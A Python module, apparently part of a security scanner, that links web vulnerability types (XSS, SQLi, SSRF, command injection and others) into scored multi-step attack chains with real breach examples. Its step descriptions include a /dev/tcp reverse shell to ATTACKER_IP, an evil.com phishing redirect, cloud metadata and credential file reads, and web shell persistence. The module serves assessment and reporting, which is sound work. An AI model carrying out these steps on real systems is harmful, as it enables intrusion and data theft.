"""
Vulnerability Chain Engine - Multi-hop attack path builder.

Models real-world vulnerability chains where one finding enables the next:
  XSS → Session Theft → Auth Bypass → Account Takeover
  SQLi → Credential Extraction → Admin Login → Full Database Access
  SSRF → Cloud Metadata → Credential Theft → Infrastructure Access

Replaces the old post-scan co-occurrence checker with a proper directed graph
that builds multi-step chains with impact scoring and attack path generation.

DOES NOT modify RAG files, payload database, or existing modules.
"""

import hashlib
import json
import os
from dataclasses import dataclass, field
from enum import Enum
from typing import Any
from modules.logging_config import logger


class ChainSeverity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class ChainStep:
    step_number: int
    vuln_type: str
    action: str
    description: str
    required_condition: str = ""
    impact: str = ""


@dataclass
class AttackChain:
    chain_id: str
    name: str
    description: str
    steps: list = field(default_factory=list)
    severity: str = "low"
    impact_score: float = 0.0
    cvss_estimate: str = ""
    business_impact: str = ""
    remediation_priority: str = ""
    real_world_example: str = ""
    chain_probability: float = 0.0


CHAIN_GRAPH = {
    "xss": {
        "enables": ["session_theft", "csrf_token_theft", "dom_manipulation", "keylogger"],
        "chain_to": {
            "session_theft": {
                "name": "Session Hijacking",
                "description": "XSS payload reads document.cookie or localStorage to steal session tokens",
                "steps": [
                    {
                        "action": "Inject XSS payload",
                        "description": "Reflect malicious JavaScript in the vulnerable parameter",
                        "impact": "JavaScript executes in victim's browser context",
                    },
                    {
                        "action": "Exfiltrate session token",
                        "description": "Read document.cookie, localStorage, or sessionStorage and send to attacker server",
                        "impact": "Attacker obtains valid session token",
                    },
                    {
                        "action": "Authenticate as victim",
                        "description": "Use stolen token in HTTP requests to impersonate the victim",
                        "impact": "Full account access without credentials",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Complete account takeover, data theft, unauthorized transactions",
                "real_world_example": "Twitter XSS worm (2010) - Mikeyy worm hijacked 1M+ accounts via stored XSS",
            },
            "csrf_token_theft": {
                "name": "CSRF via XSS Token Theft",
                "description": "XSS reads CSRF token from DOM, then uses it to forge authenticated requests",
                "steps": [
                    {
                        "action": "Inject XSS payload",
                        "description": "Execute JavaScript on page containing CSRF-protected forms",
                        "impact": "Access to DOM including hidden CSRF tokens",
                    },
                    {
                        "action": "Extract CSRF token",
                        "description": "Read hidden form fields or meta tags containing anti-CSRF tokens",
                        "impact": "Attacker bypasses CSRF protection",
                    },
                    {
                        "action": "Forge authenticated request",
                        "description": "Submit form with stolen CSRF token to change password, email, or perform actions",
                        "impact": "State-changing actions executed as victim",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Bypass CSRF protections, password reset, email change, unauthorized transactions",
                "real_world_example": "Facebook CSRF token theft via XSS (2011) - researchers demonstrated account takeover",
            },
            "dom_manipulation": {
                "name": "DOM Manipulation / Content Injection",
                "description": "XSS modifies page DOM to inject fake login forms or malicious links",
                "steps": [
                    {
                        "action": "Inject XSS payload",
                        "description": "Execute JavaScript that manipulates the DOM",
                        "impact": "Page content modified in victim's browser",
                    },
                    {
                        "action": "Inject fake UI elements",
                        "description": "Create fake login forms, password change dialogs, or download prompts",
                        "impact": "Victim interacts with attacker-controlled UI",
                    },
                    {
                        "action": "Capture credentials or install malware",
                        "description": "Collect submitted credentials or trigger malicious downloads",
                        "impact": "Credential theft or malware installation",
                    },
                ],
                "severity_boost": 1,
                "business_impact": "Phishing, credential theft, malware distribution via trusted domain",
                "real_world_example": "British Airways Magecart attack (2018) - XSS injected payment card skimmer",
            },
            "keylogger": {
                "name": "Client-Side Keylogger",
                "description": "XSS installs keyboard event listener to capture all user input",
                "steps": [
                    {
                        "action": "Inject XSS payload",
                        "description": "Execute JavaScript that registers keyboard event listeners",
                        "impact": "All keystrokes captured in real-time",
                    },
                    {
                        "action": "Capture sensitive input",
                        "description": "Record passwords, credit card numbers, PII typed on the page",
                        "impact": "Sensitive data exfiltrated to attacker server",
                    },
                ],
                "severity_boost": 1,
                "business_impact": "Credential theft, financial data capture, PII exfiltration",
                "real_world_example": "Newegg Magecart (2018) - XSS keylogger captured payment details",
            },
        },
    },
    "sqli": {
        "enables": ["credential_extraction", "data_exfiltration", "rce_via_sqli"],
        "chain_to": {
            "credential_extraction": {
                "name": "Credential Extraction & Account Takeover",
                "description": "SQL injection extracts password hashes or plaintext credentials from database",
                "steps": [
                    {
                        "action": "Confirm SQL injection",
                        "description": "Identify injectable parameter with error-based or boolean-blind probes",
                        "impact": "Database query control confirmed",
                    },
                    {
                        "action": "Enumerate database schema",
                        "description": "Use INFORMATION_SCHEMA or equivalent to find user/credential tables",
                        "impact": "Full database structure mapped",
                    },
                    {
                        "action": "Extract credentials",
                        "description": "Dump username, password hash, email from user tables via UNION or blind extraction",
                        "impact": "User credentials obtained",
                    },
                    {
                        "action": "Crack hashes / login directly",
                        "description": "Crack password hashes offline or use SQL injection to bypass login",
                        "impact": "Direct account access",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Full database compromise, mass account takeover, data breach",
                "real_world_example": "Equifax breach (2017) - SQLi on Apache Struts exposed 147M records",
            },
            "data_exfiltration": {
                "name": "Full Data Exfiltration",
                "description": "SQL injection used to systematically extract entire database contents",
                "steps": [
                    {
                        "action": "Confirm SQL injection",
                        "description": "Identify injectable parameter and determine database type",
                        "impact": "Database access confirmed",
                    },
                    {
                        "action": "Enumerate all tables and columns",
                        "description": "Query schema metadata to map entire database",
                        "impact": "Complete database structure known",
                    },
                    {
                        "action": "Extract data in chunks",
                        "description": "Use SUBSTRING/LIMIT to dump all rows via blind or UNION-based extraction",
                        "impact": "All data accessible to attacker",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Complete data breach, regulatory fines (GDPR, HIPAA), reputational damage",
                "real_world_example": "TalkTalk breach (2015) - SQLi exposed 157K bank details, £400K fine",
            },
            "rce_via_sqli": {
                "name": "Remote Code Execution via SQL Injection",
                "description": "SQL injection leverages database features (xp_cmdshell, INTO OUTFILE) to execute OS commands",
                "steps": [
                    {
                        "action": "Confirm SQL injection",
                        "description": "Identify injectable parameter with sufficient privileges",
                        "impact": "Database query control confirmed",
                    },
                    {
                        "action": "Escalate to code execution",
                        "description": "Use xp_cmdshell (MSSQL), INTO OUTFILE (MySQL), or COPY TO PROGRAM (PostgreSQL)",
                        "impact": "OS command execution as database user",
                    },
                    {
                        "action": "Establish persistent access",
                        "description": "Upload web shell, create reverse shell, or add backdoor account",
                        "impact": "Persistent server access",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Full server compromise, lateral movement, persistent backdoor access",
                "real_world_example": "Heartland Payment Systems (2008) - SQLi + RCE exposed 130M payment cards",
            },
        },
    },
    "ssrf": {
        "enables": ["cloud_metadata_access", "internal_network_scan", "service_enumeration"],
        "chain_to": {
            "cloud_metadata_access": {
                "name": "Cloud Credential Theft via Metadata",
                "description": "SSRF accesses cloud instance metadata to steal IAM credentials",
                "steps": [
                    {
                        "action": "Confirm SSRF",
                        "description": "Verify ability to make outbound requests from the server",
                        "impact": "Server-side request capability confirmed",
                    },
                    {
                        "action": "Access metadata endpoint",
                        "description": "Request 169.254.169.254/latest/meta-data/ (AWS) or equivalent for GCP/Azure",
                        "impact": "Instance metadata exposed",
                    },
                    {
                        "action": "Extract IAM credentials",
                        "description": "Retrieve IAM role credentials from metadata service",
                        "impact": "Cloud API credentials obtained",
                    },
                    {
                        "action": "Access cloud resources",
                        "description": "Use credentials to access S3, RDS, Lambda, or other cloud services",
                        "impact": "Full cloud infrastructure access",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Complete cloud infrastructure compromise, data exfiltration, cryptojacking",
                "real_world_example": "Capital One breach (2019) - SSRF to metadata exposed 100M customer records",
            },
            "internal_network_scan": {
                "name": "Internal Network Reconnaissance",
                "description": "SSRF used to scan internal network and discover services",
                "steps": [
                    {
                        "action": "Confirm SSRF",
                        "description": "Verify ability to reach internal IP addresses",
                        "impact": "Internal network accessible from server",
                    },
                    {
                        "action": "Scan internal services",
                        "description": "Probe common internal ports (8080, 3306, 6379, 9200, 27017)",
                        "impact": "Internal service topology mapped",
                    },
                    {
                        "action": "Access unprotected services",
                        "description": "Connect to databases, caches, or admin panels without authentication",
                        "impact": "Internal data and services accessible",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Internal network exposure, data access from unprotected services",
                "real_world_example": "Shopify SSRF (2020) - internal network access via SSRF vulnerability",
            },
            "service_enumeration": {
                "name": "Internal Service Exploitation",
                "description": "SSRF discovers and exploits internal services (Redis, MongoDB, Docker API)",
                "steps": [
                    {
                        "action": "Discover internal services",
                        "description": "Probe for Redis (6379), MongoDB (27017), Docker API (2375), etc.",
                        "impact": "Internal services identified",
                    },
                    {
                        "action": "Exploit exposed service",
                        "description": "Send crafted requests to exploit the internal service",
                        "impact": "Service-level compromise",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Data store compromise, container escape, lateral movement",
                "real_world_example": "Uber SSRF (2017) - accessed internal services via SSRF",
            },
        },
    },
    "idor": {
        "enables": ["data_enumeration", "privilege_escalation", "account_takeover"],
        "chain_to": {
            "data_enumeration": {
                "name": "Mass Data Enumeration via IDOR",
                "description": "IDOR allows systematic enumeration of all user records or resources",
                "steps": [
                    {
                        "action": "Confirm IDOR",
                        "description": "Access another user's data by modifying ID parameter",
                        "impact": "Access control bypass confirmed",
                    },
                    {
                        "action": "Enumerate ID range",
                        "description": "Systematically iterate through sequential IDs or GUIDs",
                        "impact": "All user records accessible",
                    },
                    {
                        "action": "Extract all data",
                        "description": "Download complete dataset of user profiles, orders, messages, etc.",
                        "impact": "Mass data breach via single vulnerability",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Mass data breach, regulatory violations, user privacy violation",
                "real_world_example": "Venmo IDOR (2017) - exposed 2M+ user transactions via ID manipulation",
            },
            "privilege_escalation": {
                "name": "Privilege Escalation via IDOR",
                "description": "IDOR on admin endpoints or role parameters allows privilege escalation",
                "steps": [
                    {
                        "action": "Confirm IDOR",
                        "description": "Access another user's resources by modifying identifiers",
                        "impact": "Access control bypass confirmed",
                    },
                    {
                        "action": "Identify admin endpoints",
                        "description": "Discover admin-only endpoints or role parameters via enumeration",
                        "impact": "Admin functionality mapped",
                    },
                    {
                        "action": "Escalate privileges",
                        "description": "Modify role parameter or access admin endpoints directly",
                        "impact": "Administrative access granted",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Admin access, full system control, data manipulation",
                "real_world_example": "Uber IDOR (2016) - accessed driver records via IDOR escalation",
            },
            "account_takeover": {
                "name": "Account Takeover via IDOR",
                "description": "IDOR on account management endpoints allows takeover of any user account",
                "steps": [
                    {
                        "action": "Confirm IDOR",
                        "description": "Access another user's account settings via ID manipulation",
                        "impact": "Account management access confirmed",
                    },
                    {
                        "action": "Modify account settings",
                        "description": "Change email, password, or 2FA settings for target account",
                        "impact": "Account credentials changed by attacker",
                    },
                    {
                        "action": "Lock out legitimate user",
                        "description": "Original user cannot access account; attacker has full control",
                        "impact": "Complete account takeover",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Account takeover, identity theft, unauthorized transactions",
                "real_world_example": "Grindr IDOR (2020) - accessed user profiles and messages",
            },
        },
    },
    "jwt": {
        "enables": ["token_forgery", "privilege_escalation_via_claims"],
        "chain_to": {
            "token_forgery": {
                "name": "JWT Token Forgery & Authentication Bypass",
                "description": "Weak JWT algorithm or key allows forging arbitrary tokens",
                "steps": [
                    {
                        "action": "Identify JWT weakness",
                        "description": "Detect alg:none, weak HMAC key, or key confusion vulnerability",
                        "impact": "JWT validation can be bypassed",
                    },
                    {
                        "action": "Forge authentication token",
                        "description": "Create JWT with arbitrary user ID, role, or expiration",
                        "impact": "Valid token accepted by server",
                    },
                    {
                        "action": "Authenticate as arbitrary user",
                        "description": "Use forged token to access any user's account",
                        "impact": "Authentication completely bypassed",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Authentication bypass, arbitrary account access, full system compromise",
                "real_world_example": "Auth0 JWT vulnerability (2017) - alg:none attack bypassed authentication",
            },
            "privilege_escalation_via_claims": {
                "name": "Privilege Escalation via JWT Claim Manipulation",
                "description": "Modify JWT claims (role, admin, scope) to escalate privileges",
                "steps": [
                    {
                        "action": "Decode and analyze JWT",
                        "description": "Identify role/permission claims in the JWT payload",
                        "impact": "Privilege structure mapped",
                    },
                    {
                        "action": "Modify claims",
                        "description": "Change role to admin, add elevated scopes, or remove restrictions",
                        "impact": "Elevated privileges encoded in token",
                    },
                    {
                        "action": "Re-sign and submit",
                        "description": "Sign modified token with weak key or alg:none",
                        "impact": "Elevated token accepted by server",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Privilege escalation, admin access, unauthorized operations",
                "real_world_example": "Various API platforms - JWT claim manipulation leading to admin access",
            },
        },
    },
    "open_redirect": {
        "enables": ["phishing", "oauth_token_theft", "ssrf_variant"],
        "chain_to": {
            "phishing": {
                "name": "Phishing via Open Redirect",
                "description": "Open redirect chains to attacker-controlled phishing page on trusted domain",
                "steps": [
                    {
                        "action": "Identify redirect parameter",
                        "description": "Find parameter that controls redirect destination",
                        "impact": "Redirect control confirmed",
                    },
                    {
                        "action": "Craft phishing URL",
                        "description": "Create URL: https://trusted.com/redirect?to=https://evil.com/fake-login",
                        "impact": "Victim sees trusted domain in initial URL",
                    },
                    {
                        "action": "Harvest credentials",
                        "description": "Phishing page mimics login, captures credentials",
                        "impact": "User credentials stolen",
                    },
                ],
                "severity_boost": 1,
                "business_impact": "Credential phishing, brand impersonation, user compromise",
                "real_world_example": "Google open redirect (multiple) - used in phishing campaigns",
            },
            "oauth_token_theft": {
                "name": "OAuth Token Theft via Open Redirect",
                "description": "Open redirect intercepts OAuth callback to steal authorization codes or tokens",
                "steps": [
                    {
                        "action": "Identify OAuth flow",
                        "description": "Find OAuth authorization endpoint with redirect_uri parameter",
                        "impact": "OAuth flow mapped",
                    },
                    {
                        "action": "Redirect callback to attacker",
                        "description": "Modify redirect_uri to send authorization code to attacker server",
                        "impact": "OAuth code intercepted",
                    },
                    {
                        "action": "Exchange code for token",
                        "description": "Use intercepted code to obtain access token from OAuth provider",
                        "impact": "Valid OAuth access token obtained",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "OAuth account takeover, third-party service access, data theft",
                "real_world_example": "Multiple OAuth implementations - redirect_uri manipulation",
            },
            "ssrf_variant": {
                "name": "SSRF via Open Redirect",
                "description": "Open redirect used as pivot to reach internal services",
                "steps": [
                    {
                        "action": "Identify server-side redirect",
                        "description": "Confirm redirect is processed server-side (not browser-based)",
                        "impact": "Server-side request capability",
                    },
                    {
                        "action": "Redirect to internal target",
                        "description": "Redirect to internal IP or service (169.254.169.254, localhost)",
                        "impact": "Internal service accessed",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Internal network access, metadata exposure",
                "real_world_example": "Server-side open redirects effectively function as SSRF",
            },
        },
    },
    "command_injection": {
        "enables": ["rce", "file_read_via_cmd", "reverse_shell"],
        "chain_to": {
            "rce": {
                "name": "Remote Code Execution",
                "description": "Command injection leads to arbitrary code execution on the server",
                "steps": [
                    {
                        "action": "Confirm command injection",
                        "description": "Execute simple commands (whoami, id, uname) via injection",
                        "impact": "Command execution confirmed",
                    },
                    {
                        "action": "Enumerate system",
                        "description": "Gather system info: users, groups, installed software, network config",
                        "impact": "System topology mapped",
                    },
                    {
                        "action": "Execute arbitrary code",
                        "description": "Run any command with the privileges of the web application",
                        "impact": "Full code execution",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Full server compromise, data theft, lateral movement",
                "real_world_example": "Apache Log4Shell (2021) - RCE via command injection in log processing",
            },
            "reverse_shell": {
                "name": "Reverse Shell Establishment",
                "description": "Command injection used to establish persistent reverse shell access",
                "steps": [
                    {
                        "action": "Confirm command injection",
                        "description": "Verify ability to execute system commands",
                        "impact": "Command execution confirmed",
                    },
                    {
                        "action": "Establish reverse shell",
                        "description": "Execute bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 or equivalent",
                        "impact": "Interactive shell access to server",
                    },
                    {
                        "action": "Maintain persistent access",
                        "description": "Install cron job, SSH key, or backdoor for persistence",
                        "impact": "Persistent access maintained",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Persistent server access, lateral movement, data exfiltration",
                "real_world_example": "Various web application RCE exploits leading to full compromise",
            },
            "file_read_via_cmd": {
                "name": "File System Access via Command Injection",
                "description": "Command injection used to read/write arbitrary files on the server",
                "steps": [
                    {
                        "action": "Confirm command injection",
                        "description": "Verify command execution capability",
                        "impact": "Command execution confirmed",
                    },
                    {
                        "action": "Read sensitive files",
                        "description": "Access /etc/passwd, config files, database credentials, source code",
                        "impact": "Sensitive files read",
                    },
                    {
                        "action": "Write malicious files",
                        "description": "Upload web shell or modify application files",
                        "impact": "Application modified, persistent access",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Sensitive data exposure, application modification, backdoor installation",
                "real_world_example": "Various CMS plugins - command injection leading to file access",
            },
        },
    },
    "deserialization": {
        "enables": ["rce", "data_manipulation"],
        "chain_to": {
            "rce": {
                "name": "RCE via Deserialization Gadget Chain",
                "description": "Insecure deserialization triggers gadget chain execution leading to RCE",
                "steps": [
                    {
                        "action": "Confirm deserialization",
                        "description": "Identify serialized object injection point",
                        "impact": "Deserialization confirmed",
                    },
                    {
                        "action": "Identify gadget chain",
                        "description": "Find exploitable gadget chain in application dependencies",
                        "impact": "Gadget chain identified",
                    },
                    {
                        "action": "Execute arbitrary code",
                        "description": "Craft malicious serialized object that triggers code execution",
                        "impact": "Remote code execution",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Full server compromise, data theft, persistent access",
                "real_world_example": "Apache Commons Collections (2015) - deserialization RCE affected thousands of apps",
            },
            "data_manipulation": {
                "name": "Data Manipulation via Deserialization",
                "description": "Deserialization allows modifying application state and data",
                "steps": [
                    {
                        "action": "Confirm deserialization",
                        "description": "Identify serialized object injection point",
                        "impact": "Deserialization confirmed",
                    },
                    {
                        "action": "Modify serialized data",
                        "description": "Alter object properties to change application behavior",
                        "impact": "Application state modified",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Data manipulation, privilege escalation, business logic bypass",
                "real_world_example": "Java deserialization attacks in enterprise applications",
            },
        },
    },
    "file_upload": {
        "enables": ["web_shell", "stored_xss"],
        "chain_to": {
            "web_shell": {
                "name": "Web Shell Upload & RCE",
                "description": "Malicious file upload leads to web shell and remote code execution",
                "steps": [
                    {
                        "action": "Upload malicious file",
                        "description": "Upload .php, .jsp, .asp web shell bypassing any client/server validation",
                        "impact": "Malicious file stored on server",
                    },
                    {
                        "action": "Access uploaded file",
                        "description": "Navigate to uploaded file URL to trigger execution",
                        "impact": "Web shell accessible",
                    },
                    {
                        "action": "Execute commands",
                        "description": "Send commands via web shell interface",
                        "impact": "Remote code execution",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Full server compromise, persistent backdoor, data theft",
                "real_world_example": "Numerous CMS and framework file upload bypasses",
            },
            "stored_xss": {
                "name": "Stored XSS via File Upload",
                "description": "Upload SVG/HTML file containing malicious JavaScript that executes when accessed",
                "steps": [
                    {
                        "action": "Upload malicious file",
                        "description": "Upload SVG or HTML file with embedded JavaScript",
                        "impact": "Malicious file stored on server",
                    },
                    {
                        "action": "Trigger execution",
                        "description": "Access the file URL to execute JavaScript in browser context",
                        "impact": "XSS payload executes for anyone accessing the file",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Stored XSS affects all users who access the uploaded file",
                "real_world_example": "GitHub SVG XSS (2017) - stored XSS via SVG file upload",
            },
        },
    },
    "ssti": {
        "enables": ["rce"],
        "chain_to": {
            "rce": {
                "name": "RCE via Server-Side Template Injection",
                "description": "SSTI exploited to execute arbitrary OS commands on the server",
                "steps": [
                    {
                        "action": "Confirm SSTI",
                        "description": "Verify template expression evaluation with arithmetic payloads",
                        "impact": "Template injection confirmed",
                    },
                    {
                        "action": "Identify template engine",
                        "description": "Determine engine (Jinja2, Twig, FreeMarker, etc.) via engine-specific payloads",
                        "impact": "Engine identified, exploit path known",
                    },
                    {
                        "action": "Escape sandbox",
                        "description": "Access __class__.__mro__ (Python) or equivalent to reach OS-level objects",
                        "impact": "Sandbox escape achieved",
                    },
                    {
                        "action": "Execute OS commands",
                        "description": "Use subprocess.Popen, os.popen, or equivalent to run system commands",
                        "impact": "Remote code execution",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Full server compromise, data theft, lateral movement",
                "real_world_example": "Flask/Jinja2 SSTI in numerous web applications leading to RCE",
            },
        },
    },
    "xxe": {
        "enables": ["file_read", "ssrf_via_xxe"],
        "chain_to": {
            "file_read": {
                "name": "File Read via XXE",
                "description": "XXE entity reads local files from the server filesystem",
                "steps": [
                    {
                        "action": "Confirm XXE",
                        "description": "Verify XML entity processing with simple test payload",
                        "impact": "XXE injection confirmed",
                    },
                    {
                        "action": "Read local files",
                        "description": "Use file:// protocol in external entity to read /etc/passwd, config files",
                        "impact": "Server file contents exposed",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Sensitive file exposure, configuration theft, credential discovery",
                "real_world_example": "XXE in various XML parsers - file read and SSRF",
            },
            "ssrf_via_xxe": {
                "name": "SSRF via XXE",
                "description": "XXE external entity triggers server-side requests to internal resources",
                "steps": [
                    {
                        "action": "Confirm XXE",
                        "description": "Verify XML entity processing",
                        "impact": "XXE injection confirmed",
                    },
                    {
                        "action": "Trigger internal request",
                        "description": "Use external entity to request internal URLs (169.254.169.254, localhost)",
                        "impact": "Internal service accessed via XXE",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Internal network access, metadata exposure, service enumeration",
                "real_world_example": "XXE-based SSRF in multiple enterprise applications",
            },
        },
    },
    "csrf": {
        "enables": ["state_change", "account_takeover"],
        "chain_to": {
            "state_change": {
                "name": "Unauthorized State Change",
                "description": "CSRF allows performing actions on behalf of authenticated users",
                "steps": [
                    {
                        "action": "Identify unprotected endpoint",
                        "description": "Find state-changing endpoint without CSRF protection",
                        "impact": "CSRF vulnerability confirmed",
                    },
                    {
                        "action": "Craft malicious request",
                        "description": "Create HTML form or JavaScript that triggers the action",
                        "impact": "Action can be triggered from attacker's page",
                    },
                    {
                        "action": "Trick victim into visiting",
                        "description": "Victim visits attacker's page while authenticated",
                        "impact": "Action executed as victim",
                    },
                ],
                "severity_boost": 1,
                "business_impact": "Unauthorized actions: password change, fund transfer, data modification",
                "real_world_example": "CSRF in banking applications - unauthorized fund transfers",
            },
            "account_takeover": {
                "name": "Account Takeover via CSRF",
                "description": "CSRF on email/password change endpoint enables full account takeover",
                "steps": [
                    {
                        "action": "Identify account management endpoint",
                        "description": "Find email/password change endpoint without CSRF protection",
                        "impact": "CSRF on critical endpoint confirmed",
                    },
                    {
                        "action": "Change account credentials",
                        "description": "CSRF request changes victim's email or password",
                        "impact": "Attacker controls account credentials",
                    },
                    {
                        "action": "Lock out victim",
                        "description": "Victim cannot access account; attacker logs in with new credentials",
                        "impact": "Complete account takeover",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Complete account takeover, identity theft",
                "real_world_example": "CSRF-based account takeover in numerous web applications",
            },
        },
    },
    "path_traversal": {
        "enables": ["file_read", "config_disclosure"],
        "chain_to": {
            "file_read": {
                "name": "Sensitive File Read via Path Traversal",
                "description": "Path traversal accesses sensitive system and application files",
                "steps": [
                    {
                        "action": "Confirm path traversal",
                        "description": "Access /etc/passwd or equivalent via ../ traversal",
                        "impact": "File read confirmed",
                    },
                    {
                        "action": "Read sensitive files",
                        "description": "Access config files, source code, database credentials, SSH keys",
                        "impact": "Sensitive data exposed",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Credential exposure, source code leak, infrastructure access",
                "real_world_example": "Path traversal in various web servers and applications",
            },
            "config_disclosure": {
                "name": "Configuration Disclosure",
                "description": "Path traversal reveals application configuration with secrets",
                "steps": [
                    {
                        "action": "Confirm path traversal",
                        "description": "Verify ability to read files outside web root",
                        "impact": "File read confirmed",
                    },
                    {
                        "action": "Read config files",
                        "description": "Access .env, config.yml, database.yml, web.config",
                        "impact": "Application secrets exposed",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "API keys, database credentials, and other secrets exposed",
                "real_world_example": "Config file exposure via traversal in numerous frameworks",
            },
        },
    },
    "graphql": {
        "enables": ["data_exfiltration", "auth_bypass"],
        "chain_to": {
            "data_exfiltration": {
                "name": "Mass Data Exfiltration via GraphQL",
                "description": "GraphQL introspection and batching enables systematic data extraction",
                "steps": [
                    {
                        "action": "Introspect schema",
                        "description": "Use __schema query to map all types, fields, and mutations",
                        "impact": "Complete API schema known",
                    },
                    {
                        "action": "Batch data queries",
                        "description": "Use batching or aliases to extract large amounts of data in single request",
                        "impact": "Mass data extraction",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Mass data breach, complete API data exposure",
                "real_world_example": "Facebook GraphQL data exposure (2019) - 50M+ users affected",
            },
            "auth_bypass": {
                "name": "Authentication Bypass via GraphQL",
                "description": "GraphQL mutations bypass authentication or authorization checks",
                "steps": [
                    {
                        "action": "Identify unprotected mutations",
                        "description": "Find mutations that lack authentication or authorization checks",
                        "impact": "Unprotected operations identified",
                    },
                    {
                        "action": "Execute unauthorized actions",
                        "description": "Call mutations to modify data, create accounts, or escalate privileges",
                        "impact": "Unauthorized actions executed",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Authentication bypass, unauthorized data modification",
                "real_world_example": "GraphQL authorization bypass in multiple implementations",
            },
        },
    },
    "race_conditions": {
        "enables": ["limit_bypass", "double_spend", "privilege_escalation"],
        "chain_to": {
            "limit_bypass": {
                "name": "Rate Limit Bypass via Race Condition",
                "description": "Race condition bypasses rate limits, allowing brute force or abuse",
                "steps": [
                    {
                        "action": "Identify race condition",
                        "description": "Confirm TOCTOU vulnerability in rate-limited endpoint",
                        "impact": "Race condition confirmed",
                    },
                    {
                        "action": "Send concurrent requests",
                        "description": "Fire multiple requests simultaneously to bypass rate limit check",
                        "impact": "Rate limit bypassed",
                    },
                ],
                "severity_boost": 1,
                "business_impact": "Brute force success, coupon abuse, resource exhaustion",
                "real_world_example": "Race condition rate limit bypass in various APIs",
            },
            "double_spend": {
                "name": "Double Spend via Race Condition",
                "description": "Race condition on financial transactions enables double spending",
                "steps": [
                    {
                        "action": "Identify race condition",
                        "description": "Confirm TOCTOU in balance check or deduction logic",
                        "impact": "Race condition confirmed",
                    },
                    {
                        "action": "Send concurrent transactions",
                        "description": "Fire multiple transfer requests before balance updates",
                        "impact": "Multiple transactions succeed with insufficient funds",
                    },
                ],
                "severity_boost": 3,
                "business_impact": "Financial loss, double spending, fraud",
                "real_world_example": "Race condition double-spend in payment systems",
            },
            "privilege_escalation": {
                "name": "Privilege Escalation via Race Condition",
                "description": "Race condition on role assignment or permission check enables privilege escalation",
                "steps": [
                    {
                        "action": "Identify race condition",
                        "description": "Confirm TOCTOU in permission or role check",
                        "impact": "Race condition confirmed",
                    },
                    {
                        "action": "Exploit timing window",
                        "description": "Send privileged request during role assignment window",
                        "impact": "Privileged action succeeds without proper role",
                    },
                ],
                "severity_boost": 2,
                "business_impact": "Privilege escalation, unauthorized access to admin functions",
                "real_world_example": "Race condition privilege escalation in various web applications",
            },
        },
    },
}

BASE_SEVERITY_SCORES = {
    "low": 1.0,
    "medium": 2.0,
    "high": 3.5,
    "critical": 5.0,
}

SEVERITY_FROM_SCORE = [
    (1.0, "low"),
    (3.0, "medium"),
    (7.0, "high"),
    (9.0, "critical"),
]


CONFIDENCE_WEIGHT = {
    "high": 1.0,
    "medium": 0.6,
    "low": 0.3,
}

EXPLOITABILITY_BY_LENGTH = {
    2: 0.9,
    3: 0.7,
    4: 0.5,
    5: 0.3,
}

IMPACT_SEVERITY_FACTOR = {
    "low": 1.0,
    "medium": 2.0,
    "high": 3.0,
    "critical": 4.0,
}

MIN_CHAIN_PROBABILITY = 0.15
MAX_CHAINS_PER_ENDPOINT = 3


class ChainEngine:
    """Multi-hop vulnerability chain builder.

    Takes confirmed findings from the attack flow engine, traverses the chain graph,
    and builds realistic attack paths with impact scoring.
    """

    def __init__(self):
        self._chain_graph = CHAIN_GRAPH
        self._chain_log = []

    def _log(self, message: str):
        logger.info(f"[CHAIN] {message}")
        self._chain_log.append(message)

    def _get_base_severity(self, vuln_type: str) -> str:
        type_severity = {
            "xss": "medium",
            "sqli": "critical",
            "ssrf": "high",
            "xxe": "high",
            "ssti": "high",
            "command_injection": "critical",
            "path_traversal": "medium",
            "deserialization": "critical",
            "open_redirect": "low",
            "csrf": "medium",
            "idor": "high",
            "jwt": "high",
            "graphql": "medium",
            "race_conditions": "medium",
            "file_upload": "high",
        }
        return type_severity.get(vuln_type, "low")

    def _calculate_chain_score(self, steps: list) -> float:
        if not steps:
            return 0.0
        base = BASE_SEVERITY_SCORES.get("medium", 2.0)
        depth_bonus = len(steps) * 1.5
        final_bonus = 2.0
        return round(base + depth_bonus + final_bonus, 1)

    def _score_to_severity(self, score: float) -> str:
        result = "low"
        for threshold, severity in SEVERITY_FROM_SCORE:
            if score >= threshold:
                result = severity
        return result

    def _generate_chain_id(self, vuln_type: str, chain_name: str, endpoint: str) -> str:
        raw = f"{vuln_type}:{chain_name}:{endpoint}"
        return hashlib.md5(raw.encode()).hexdigest()[:12]

    def build_chains(self, findings: list, endpoint: str) -> list:
        """Build attack chains from confirmed findings.

        Guard: Only builds chains when:
        - At least one finding is high-confidence + confirmed
        - The vuln type has defined follow-up dependencies in the graph

        Chains are ranked by probability (confidence × exploitability × impact)
        and capped at MAX_CHAINS_PER_ENDPOINT to prevent noise.
        """
        chains = []

        confirmed_findings = []
        for finding in findings:
            vtype = finding.get("type", "")
            confidence = finding.get("confidence", "")
            validation = finding.get("validation_status", "")
